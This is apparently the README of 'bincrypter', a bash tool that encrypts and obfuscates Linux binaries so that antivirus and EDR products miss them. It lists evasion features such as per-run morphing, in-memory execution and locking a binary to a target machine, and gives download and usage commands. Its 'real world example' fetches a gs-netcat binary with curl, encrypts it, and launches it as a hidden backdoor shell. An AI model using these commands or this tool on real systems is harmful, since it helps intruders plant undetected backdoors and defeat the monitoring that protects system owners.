
## A Linux Binary Runtime Crypter - in BASH!

- Obfuscate & encrypt any ELF binary
- Obfuscate & encrypt any SHELL-script
- AV/EDR death: Morphing + different signature every time
- 100% in-memory. No temporary files
- Not soiling the filesystem
- Double or triple encrypt the same binary (or itself)
- Resulting binary is heavily obfuscated (`string` only shows garbage)
- Living off the Land (LotL): Only needs `/bin/sh` + `perl` + `openssl`
- Architecture agnostic: Works on x86_64, aarch64, arm6, mips, ...
- *Lock* a binary to a target system and make it fail to run anywhere else.

![exmaple](https://github.com/user-attachments/assets/c8eff8e4-f879-4017-9015-6422e03dd6ac)

Download:
```shell
curl -SsfL https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter -o bincrypter
chmod +x bincrypter
./bincrypter -h
```

Example:
```shell
cp /usr/bin/id id
./bincrypter id
# Compressed: 68552 --> 24176 [35%]

./id
# uid=0(root) gid=0(root) groups=0(root)
```

Set a custom PASSWORD (optionally):
```shell
cp /usr/bin/id id
./bincrypter id foobar
# Compressed: 68552 --> 23860 [34%]

./id
# Enter Password: foobar
# uid=0(root) gid=0(root) groups=0(root)
```

Real world example (install a backdoor with a unique signature):
```shell
curl -SsfL "https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)" | PASSWORD="foobar" ./bincrypter >gsnc
chmod +x gsnc
PASSWORD="foobar" GS_ARGS="-ilD -s ChangeMe" ./gsnc
```

---
Other great work:  
https://github.com/guitmz/ezuri  
https://github.com/upx/upx  

---
Join the fun: https://thc.org/ops  
bsky: [@hackerschoice.bsky.social](https://bsky.app/profile/hackerschoice.bsky.social)  
Mastodon: [@thc@infosec.exchange](https://infosec.exchange/@thc)




